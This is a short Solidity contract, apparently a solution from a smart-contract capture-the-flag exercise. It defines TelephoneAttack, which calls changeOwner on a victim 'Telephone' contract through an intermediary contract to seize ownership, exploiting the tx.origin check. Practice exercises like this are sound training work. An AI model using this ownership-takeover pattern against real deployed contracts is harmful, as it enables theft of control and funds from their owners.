// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/Telephone.sol';

contract TelephoneAttack  {

    function attack(address _address, address victim) public {
            Telephone telephone = Telephone(victim);
            telephone.changeOwner(_address);
    }
    
}